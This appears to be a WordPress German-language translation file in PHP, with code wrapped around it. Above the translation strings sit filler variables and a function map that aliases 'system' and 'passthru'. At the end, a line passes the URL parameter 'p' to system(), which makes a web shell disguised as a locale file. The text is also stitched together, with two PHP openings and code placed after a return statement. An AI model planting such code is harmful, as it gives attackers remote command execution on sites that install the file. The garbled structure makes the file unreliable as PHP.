<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php
return ['po-revision-date'=>'2024-01-31 19:08:22+0000','mime-version'=>'1.0','content-type'=>'text/plain; charset=UTF-8','content-transfer-encoding'=>'8bit','plural-forms'=>'nplurals=2; plural=n != 1;','x-generator'=>'GlotPress/4.0.0-beta.2','language'=>'de','project-id-version'=>'WordPress - 6.4.x - Development','messages'=>['html_lang_attribute'=>'de-CH','text directionltr'=>'ltr','number_format_decimal_point'=>',','number_format_thousands_sep'=>'.','Update %s now'=>'Jetzt %s aktualisieren','[%1$s] Confirm Action: %2$s'=>'[%1$s] Aktion bestätigen: %2$s','[%s] Erasure Request Fulfilled'=>'[%s] Löschauftrag ausgeführt','[%s] Personal Data Export'=>'[%s] Export personenbezogener Daten']];

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>